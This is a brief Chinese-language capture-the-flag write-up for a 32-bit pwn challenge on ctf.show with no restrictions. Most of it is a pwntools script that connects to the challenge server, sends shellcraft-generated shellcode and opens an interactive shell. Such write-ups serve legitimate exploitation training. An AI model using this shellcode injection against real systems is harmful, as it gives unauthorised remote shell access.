# 挑战简介
32位 无限制

# 思路
利用shellcraft直接编写一个sh脚本即可  

没有限制，直接写进去就能编译  

```
from pwn import *
from LibcSearcher import *
context.log_level = "debug"

p = remote("pwn.challenge.ctf.show",28109)
elf = ELF('D:\edge 下载\pwn')

shellcode = asm(shellcraft.sh())

payload = shellcode

p.sendline(payload)

p.interactive()

```
